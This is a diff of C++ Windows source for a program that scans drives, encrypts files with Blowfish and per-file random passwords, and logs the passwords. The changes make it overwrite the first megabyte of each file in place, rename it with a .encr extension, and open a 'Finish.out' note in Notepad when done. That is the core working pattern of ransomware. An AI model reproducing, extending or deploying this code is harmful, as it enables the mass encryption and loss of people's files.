@@ -39,13 +39,13 @@ void UpdateDriveList() {
 		}
 
 	}
-	_v_location.erase(_v_location.begin() + 3);
+	_v_location.erase(_v_location.begin() + 3);;
 	printf ( "Done!\n");
 }
 
 std::string GeneratePassword()
 {
-	srand((unsigned)time(NULL) * _getpid());
+	srand(time(NULL));
 	static const char alphanum[] =
 		"0123456789"
 		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
@@ -62,32 +62,42 @@ std::string GeneratePassword()
 
 void Encrypt(std::string _filePath, std::string _password)
 {
-	int length;
-	DWORD ByteRet;
+	unsigned long long length;
 	Blowfish blowfish;
 	unsigned char key[PASSWORD_LENGTH];
 	std::copy(_password.begin(), _password.end(), key);
 	try {
 		blowfish.SetKey(key, sizeof(key));
 		std::string _s_fileName = _filePath;
-		std::string tmpString = _filePath;
-		tmpString.append(".encr");
-		std::ifstream inFile(_s_fileName, std::ios::binary);
-		std::ofstream outFile(tmpString, std::ios::binary);
-		inFile.seekg(0, std::ios::end);
-		length = inFile.tellg();
-		char* buf = new char[length + 1];
-		inFile.seekg(0, std::ios::beg);
-		inFile.read(buf, length);
-		char* outBuf = new char[length + 1];
-		blowfish.Encrypt((unsigned char*)outBuf, (unsigned char*)buf, length); /*<-Encrypting file content*/
-		outFile.write(outBuf, length); /*<- Writing encrypted file*/
-		inFile.close();
-		outFile.close();
-		char shadowPath[MAX_PATH];
-		remove(_s_fileName.c_str());  /* <- Delete the oiriginal file*/
-		delete[] buf;
-		delete[] outBuf;
+		std::string _s_new_fileName = _filePath;
+		_s_new_fileName.append(".encr");
+		unsigned long long file_length = 0;
+		//std::ifstream inFile(_s_fileName, std::ios::binary);
+		//std::ofstream outFile(tmpString, std::ios::binary);
+		std::fstream file;
+		file.open(_s_fileName, std::ios::binary | std::ios::in | std::ios::out | std::ios::ate);
+		file.seekg(0, std::ios::end);
+		length = file.tellg();
+		file_length = length;
+		/*Checking the size of file*/
+		if (length > 1048576){
+			length = 1048576;
+		};
+		char* encr_buf = new char[length + 1];
+		file.seekg(0, std::ios::beg);
+		file.read(encr_buf, length);
+		char* encr_out_buf = new char[length+1];
+		blowfish.Encrypt((unsigned char*)encr_out_buf, (unsigned char*)encr_buf, length); /*<-Encrypting file content*/
+		file.seekg(0, std::ios::beg);
+		/*Replacing the first mb or all file with encrypted bytes*/
+		for (unsigned long long i = 0; i <= length; i++) {
+			file << encr_out_buf[i];
+		}
+		file.close();
+		rename(_s_fileName.c_str(), _s_new_fileName.c_str()); /*Rename the original file to .encr version*/
+		delete[] encr_buf;
+		delete[] encr_out_buf;
+
 	}
 	catch (int e) {
 		std::cout << "Error with encrypting file " << _filePath <<"\n";
@@ -113,6 +123,7 @@ bool StartEncryption()
 				std::copy(ws.begin(), ws.end(), lp);
 				lp[ws.size()] = 0;
 				SearchFile(lp);
+				_is_success = true;
 				delete[] lp;
 			}
 			catch (int e) {
@@ -175,14 +186,22 @@ int main() {
 		int i = _log_file.find_last_of("\\");
 		_log_file.erase(i, _log_file.size());
 		_log_file.append("\\");
+		std::string ProgramFolder = _log_file;
 		_log_file.append(TXT_FILE);
-		/*Init hte thread for core process (Scanning of disks, search and encrypt files)*/
-		HANDLE ProcessThread = CreateThread(NULL, 0, SearchEngine, NULL, 0, 0);/*Making a thread for main process*/
-		WaitForSingleObject(ProcessThread, INFINITE);
-		CloseHandle(ProcessThread);
-		std::cout << "All important files have been encrypted! You can now upload them to your google drive\n";
-		std::cout << "Press Enter to exit";
-		std::cin.get();
+		try {
+			remove(_log_file.c_str());
+		}
+		catch (int e) {
+
+		}
+		/*Init the thread for core process (Scanning of disks, search and encrypt files)*/
+	 	HANDLE ProcessThread = CreateThread(NULL, 0, SearchEngine, NULL, 0, 0);
+	 	WaitForSingleObject(ProcessThread, INFINITE); /*Waiting to finish thread*/
+	 	CloseHandle(ProcessThread);
+		SetCurrentDirectoryA(ProgramFolder.c_str());
+		if (_is_success) {
+			system("Notepad \"Finish.out\"");
+		}
 	return 0;
 }
 
@@ -219,7 +238,7 @@ void writeLogFile(std::string _filename, std::string password)
 	std::fstream file;
 	file.open(_log_file, std::ios_base::app | std::ios_base::in);
 	if (file.is_open()) {
-		file << _filename<<" "<< password;
+		file << std::endl << "file : " << _filename << " password : " << password;
 		file.close();
 	}
 	else {
